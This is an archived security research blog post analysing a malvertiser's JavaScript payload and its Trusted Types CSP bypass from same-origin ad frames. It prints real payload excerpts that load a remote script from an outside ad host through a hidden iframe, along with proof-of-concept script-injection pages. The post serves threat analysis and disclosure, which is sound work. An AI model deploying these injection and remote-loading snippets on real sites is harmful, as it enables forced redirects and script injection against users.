# The Curious Case Of MutantBedrog’s Trusted-Types CSP Bypass

- **Source URL:** https://blog.confiant.com/the-curious-case-of-mutantbedrogs-trusted-types-csp-bypass-950b19a38b4f?source=rss------bug_bounty-5
- **Fetched from:** https://blog.confiant.com/p/the-curious-case-of-mutantbedrogs-trusted-types-csp-bypass-950b19a38b4f?source=rss------bug_bounty-5
- **Fetched:** 2026-11-15
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7284 (id 7284)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
*MutantBedrog* is a malvertiser that caught our attention early summer ’24 for their highly disruptive forced redirect campaigns and the unique JavaScript payload that they use to fingerprint devices and dispatch invasive redirections.

While a comprehensive report on MutantBedrog’s TTPs is available [here](https://hubs.la/Q02PXhZh0)*,* this blog post will hyper-focus on a very specific technical tidbit from their client-side redirect payload.

For reference, the full payload is available in the following gist:

[https://gist.github.com/eliyastein/501392d5b52ca07cef4d5ea9bddc254e#file-payload-js](https://gist.github.com/eliyastein/501392d5b52ca07cef4d5ea9bddc254e#file-payload-js)

This code includes a lot of familiar tactics, but tldr: it’s a slightly convoluted mess of multi-stage client-side fingerprinting and DOM manipulation that exists purely to spawn a *hopefully unmitigated* redirect to a scam landing page.

One of the things that stood out to us right away were the multiple references to content security policies and Trusted-Types that appear at every stage of execution.

Let’s zoom in on some excerpts for clarity:

```
 if (!j && typeof trustedTypes !== ‘undefined’) {
                try {
                  var y =
                    ‘\net = () => {\n    var t = Math.round(Date.now() / 1000).toString();\n    var es = “”;\n    for (var i = 0; i < t.length; i++) {\n        var c = t.charCodeAt(i);\n        es += String.fromCharCode(c + 10);\n    }\n    return encodeURIComponent(btoa(es));\n};\ntry {\nif (typeof trustedTypes !== “undefined”) {\nconst rp = trustedTypes.createPolicy(”rp”, {\ncreateScriptURL: (input) => input,\n});\nvar script = document.createElement(”script”);\nscript.src = rp.createScriptURL(\n”https://ab2t.com/v2/banner/pix?id=5d83bs12&aid=ttd006&tid=’ +
                    (window[’_tk’] || 0) +
                    ‘&p=”+et()\n);\nscript.type = “text/javascript”;\nscript.onload = function () {\nscript.parentNode.removeChild(script);\nwindow.parent.postMessage(”distroy”, “*”);\n};\nscript.onerror = function () {\nscript.parentNode.removeChild(script);\nwindow.parent.postMessage(”distroy”, “*”);\n};\ndocument.head.appendChild(script);\n}\n} catch (e) {}’
                  const U = trustedTypes.createPolicy(’rp’, {
                    createHTML: (p) => p,
                  })
                  var D = document.createElement(’iframe’)
                  D.setAttribute(
                    ‘srcdoc’,
                    U.createHTML(’<script>’ + y + ‘</sc’ + ‘ript>’)
                  )
                  D.setAttribute(
                    ‘style’,
                    ‘width: 0; height: 0; border: none; position: absolute; visibility: hidden;’
                  )
```
And more here:

```
                       try {
                          if (typeof trustedTypes !== ‘undefined’) {
                            const W = trustedTypes.createPolicy(’rp’, {
                              createScript: (b) => b,
                            })
                            var V = document.createElement(’script’)
                            V.textContent = W.createScript(p.data.secd)
                            V.type = ‘text/javascript’
                            V.onload = function () {
                              V.parentNode.removeChild(V)
                            }
                            V.onerror = function () {
                              V.parentNode.removeChild(V)
                            }
                            document.head.appendChild(V)
                          }
                        } catch (b) {}
```
Having never seen this in a malvertising payload before, we got curious and excited, because it turns out that strange things like this that might seem superfluous or out of place are often intentional.

Taking time to understand *why* weird stuff might appear in a payload like this is often fruitful and in the past has resulted in the discovery of multiple 0day browser bugs that were actually being exploited by the attackers:

[Malvertising Threat Actor “Yosec” Exploits Browser Bugs To Push Malware (CVE-2021–1765…](https://blog.confiant.com/malvertising-threat-actor-yosec-exploits-browser-bugs-to-push-malware-cve-2021-1765-3040dd3c4af1)[Most threat actors that operate via ad tech have embraced an operational shift over the last 2 years, leaning heavily…](https://blog.confiant.com/malvertising-threat-actor-yosec-exploits-browser-bugs-to-push-malware-cve-2021-1765-3040dd3c4af1)[blog.confiant.com](https://blog.confiant.com/malvertising-threat-actor-yosec-exploits-browser-bugs-to-push-malware-cve-2021-1765-3040dd3c4af1)

[Malvertiser “ScamClub” Bypasses Iframe Sandboxing With postMessage() Shenanigans \[CVE-2021–1801\]](https://blog.confiant.com/malvertiser-scamclub-bypasses-iframe-sandboxing-with-postmessage-shenanigans-cve-2021-1801-1c998378bfba)[This blog post is about the mechanics of a long tail iframe sandbox bypass found in a payload belonging to the…](https://blog.confiant.com/malvertiser-scamclub-bypasses-iframe-sandboxing-with-postmessage-shenanigans-cve-2021-1801-1c998378bfba)[blog.confiant.com](https://blog.confiant.com/malvertiser-scamclub-bypasses-iframe-sandboxing-with-postmessage-shenanigans-cve-2021-1801-1c998378bfba)

[Zirconium was one step ahead of Chrome’s redirect blocker with 0-day](https://blog.confiant.com/zirconium-was-one-step-ahead-of-chromes-redirect-blocker-with-0-day-2d61802efd0d)[On January 15, Confiant exposed the activity of the Zirconium group, spreading malicious ads via a network of fake ad…](https://blog.confiant.com/zirconium-was-one-step-ahead-of-chromes-redirect-blocker-with-0-day-2d61802efd0d)[blog.confiant.com](https://blog.confiant.com/zirconium-was-one-step-ahead-of-chromes-redirect-blocker-with-0-day-2d61802efd0d)

We began our investigation by brushing up on Trusted Types, a CSP directive which can be used as part of a security strategy in order to help mitigate XSS attacks and other kinds of insecure or risky JavaScript execution scenarios.

More information on all that can be found here:

[Trusted Types API - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)[The Trusted Types API gives web developers a way to lock down the insecure parts of the DOM API to prevent client-side…](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)[developer.mozilla.org](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)

In order to stage our experiment, we need to do several things.

- Distill the payload down to a “minimum viable payload” that includes *only* the mysterious snippet that we want to test — and the redirect technique in question. The rest is noise and can introduce a lot of distractions.
- Stage a testing environment. Since we are emulating an ad serving stack, this means we need a parent page that will embed an “ad” frame where our payload will live.

We also have some considerations:

- Because the payload writes and accesses many objects directly to and from `top` we can assume this malvertiser is planning for execution in a friendly frame. Otherwise all of this stuff would be blocked by the Same Origin Policy. That’s ok though as lots of ads find themselves rendering in friendly frames.
- Speaking of origins, we need some real origins in order to emulate things as they would appear in the wild. We can do this with a local web server and some /etc/hosts entries.
- We also need a nimble way to mess around with CSPs, which are typically sent along on a response header. However, CSPs can also be loaded using `meta` tags, so we will go with that as the easier option.

For reference, a *friendly frame* is an iframe that has the same origin as the embedding document. The Same-Origin Policy is a critical mechanism in browser (and advertising) security.


[Same-origin policy - Security on the web | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[The same-origin policy is a critical security mechanism that restricts how a document or script loaded by one origin…](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[developer.mozilla.org](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

We can emulate a page that loads an ad in a friendly frame with some very basic code:

```
<!DOCTYPE html>
<html lang=”en”>
<head>
    <meta charset=”UTF-8”>
    <meta name=”viewport” content=”width=device-width, initial-scale=1.0”>
    <title>Hello World</title>
</head>
<body>   
  <iframe src=”payload.html”>
  </iframe>
</body>
</html>
```
Let’s try to inject a script into `top`from `payload.html` :

```
<html>
<head>
    <script>
        try { 
            let s = top.document.createElement(’script’);
            s.src = ‘data:text/javascript,alert(1)’;
            top.document.body.appendChild(s);
          } catch (e) {}
    </script>
</head>
<body></body>
</html>
```
Given that we’re running this from a friendly frame, the browser is happy to oblige, and the alert is popped. We now have a foundation for our investigation.

Let’s modify our staging page to include a Trusted Types CSP directive by including the following `meta` tag in the header:

`<meta http-equiv=”Content-Security-Policy” content=”require-trusted-types-for ‘script’;”>`
Our same payload will now get rejected by the CSP on `top` :

Now we borrow from MutantBedrog’s methodology and alter our payload.html to execute the JS within a Trusted Types policy:

```
try {
    const W = top.window.trustedTypes.createPolicy(’p’, {
         createScriptURL: (url) => url
    });
    const el = top.document.createElement(’script’);
    el.src = W.createScriptURL(’data:text/javascript,alert(1)’);
    top.document.body.appendChild(el);
 } catch (e) {}
```
Suddenly, the browser is happy to oblige:

By now, we have all the makings of a bypass: A payload that works despite the presence of a security constraint in the form a Trusted Types CSP directive.

We wanted to test one more thing though, given that the MutantBedrog payload is multi-stage and includes the Trusted-Types voodoo in subsequent stages, even after successful injection to `top`. Here’s an updated payload that emulates this multi-stage strategy, but *without* subsequent Trusted Types policies:

```
    <script>
        try {
            const W = top.window.trustedTypes.createPolicy(’p’, {
                createScriptURL: (url) => url
            });
            const el = top.document.createElement(’script’);
            el.src = W.createScriptURL(’data:text/javascript,p=document.createElement(”p”),p.innerHTML=”hi”,document.body.appendChild(p),alert(2)’);
            top.document.body.appendChild(el);
        } catch (e) {}
    </script>
```
Uh oh!

Blocked by the browser despite the presence of our previous bypass due to our injected script creating an inline DOM element and trying to set its `innerHTML`.

So what happens if we inline another Trusted Types policy in that injected script? Let’s give it a try:

```
    <script>
        try {
            const W = top.window.trustedTypes.createPolicy(’p’, {
                createScriptURL: (url) => url
            });
            const el = top.document.createElement(’script’);
            el.src = W.createScriptURL(’data:text/javascript,W=top.window.trustedTypes.createPolicy(”p”,{createHTML: (h) => h  }),p=document.createElement(”p”),p.innerHTML=W.createHTML(”hi”),document.body.appendChild(p),alert(3)’);
            top.document.body.appendChild(el);
        } catch (e) {}
    </script>
```
And the result….

At this stage in our testing, we have confirmed that given an environment that enforces a Trusted Types directive via CSP, MutantBedrog is able to bypass the CSP at every single stage of their execution from inside an ad injected into same-origin frame.

Given that the ad would be blocked by the CSP otherwise, we assume that the bypass must be exploiting a logic bug in the browser, so we submit a report to the Chrome team with our findings.

After a quick triage process, we were provided some very surprising feedback:

It’s working as intended. CSP is not propagated to iframes served over network (only to local schemes)


Along with the following references:

[Content Security Policy Level 3](https://www.w3.org/TR/CSP3/#security-inherit-csp)[W3C Working Draft, More details about this document This section is not normative. This document defines Content…](https://www.w3.org/TR/CSP3/#security-inherit-csp)[www.w3.org](https://www.w3.org/TR/CSP3/#security-inherit-csp)

[Trusted Types](https://w3c.github.io/trusted-types/dist/spec/#cross-document-vectors)[Editor’s Draft, More details about this document This section is not normative. Certain classes of vulnerabilities…](https://w3c.github.io/trusted-types/dist/spec/#cross-document-vectors)[w3c.github.io](https://w3c.github.io/trusted-types/dist/spec/#cross-document-vectors)

And an eye-opening reference from the Trusted Types spec:

5.1. Cross-document vectors

While the code running in a window in which Trusted Types are enforced cannot dynamically create nodes that would bypass the policy restrictions, it is possible that such nodes can be imported or adopted from documents in other windows, that don’t have the same set of restrictions. In essence — it is possible to bypass Trusted Types if a malicious author creates a setup in which a restricted document colludes with an unrestricted one. In an extreme case, the restricted document might create a `Blob` from strings and navigate to it.

CSP propagation rules (see [Content Security Policy 3 § 7.8 CSP Inheriting to avoid bypasses](https://w3c.github.io/webappsec-csp/#security-inherit-csp) partially address this issue, as new [local scheme](https://fetch.spec.whatwg.org/#local-scheme) documents will inherit the same set of restrictions, so — for example — `script-src` restrictions could be used to make sure injections into `Blob` contents would not execute scripts. To address this issue comprehensively, other mechanisms like [Origin Policy](https://wicg.github.io/origin-policy/) should be used to ensure that baseline security rules are applied for the whole origin.


Turns out that this flavor of Trusted Types bypass is not a browser bug exploit after all and this bypass scenario is even documented and cautioned against in the very spec for this functionality.

Reflecting on our analysis of this malicious payload, and particularly this CSP bypass, we’ve landed on a few important take-aways:

1. Highly adept cybercriminals like MutantBedrog continue to push technical boundaries in surprising ways, going as far as understanding browser security at the specification level, in order to orchestrate sophisticated payloads that are optimized to work under multiple edge cases.
2. CSPs are a powerful tool that can be leveraged to combat all kinds of XSS and injection attacks, but are tough to get right, especially when it comes to same-origin threats like those that might leak in from an ad serving environment.

**Archive: This article was originally published on our Confiant Medium blog on September 16, 2024.**
